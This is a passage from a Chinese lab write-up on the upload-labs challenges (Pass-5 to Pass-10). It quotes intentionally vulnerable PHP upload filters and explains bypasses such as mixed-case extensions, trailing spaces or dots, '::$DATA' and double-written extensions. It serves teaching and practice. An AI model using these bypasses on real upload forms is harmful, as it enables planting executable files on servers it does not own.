class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627</span><br></code></pre></td></tr></table></figure>

<p>相比于pass-4，过滤了.htaccess，但将后缀转换为小写去掉了，因此可以使用大小绕过<br><img src="https://img-blog.csdnimg.cn/2019061821314398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618213222393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-6-空格绕过"><a href="#Pass-6-空格绕过" class="headerlink" title="Pass-6-空格绕过"></a>Pass-6-空格绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        $file_name = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627</span><br></code></pre></td></tr></table></figure>

<p>相比于前两题，这题没有对后缀名进行去空，因此可以在后缀名加空格绕过<br><img src="https://img-blog.csdnimg.cn/20190618213558104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618213634557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-7-点绕过"><a href="#Pass-7-点绕过" class="headerlink" title="Pass-7-点绕过"></a>Pass-7-点绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$file_name;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627</span><br></code></pre></td></tr></table></figure>

<p>没有对后缀名末尾的点进行处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过：<br><img src="https://img-blog.csdnimg.cn/20190618214054814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618214120354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-8-DATA绕过"><a href="#Pass-8-DATA绕过" class="headerlink" title="Pass-8-::$DATA绕过"></a>Pass-8-::$DATA绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627</span><br></code></pre></td></tr></table></figure>

<p>没有对后缀名中的’::$DATA’进行过滤。在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过：<br><img src="https://img-blog.csdnimg.cn/20190618215039848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618215110311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-9-点-空格-点绕过"><a href="#Pass-9-点-空格-点绕过" class="headerlink" title="Pass-9-点+空格+点绕过"></a>Pass-9-点+空格+点绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$file_name;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>代码先是去除文件名前后的空格，再去除文件名最后所有的<code>.</code>，再通过strrchar函数来寻找<code>.</code>来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过<br><img src="https://img-blog.csdnimg.cn/20190618224551741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019061822461747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10-双写绕过"></a>Pass-10-双写绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = str_ireplace($deny_ext,<span class="hljs-string">&quot;&quot;</span>, $file_name);<br>        $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$file_name;        <br>        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> 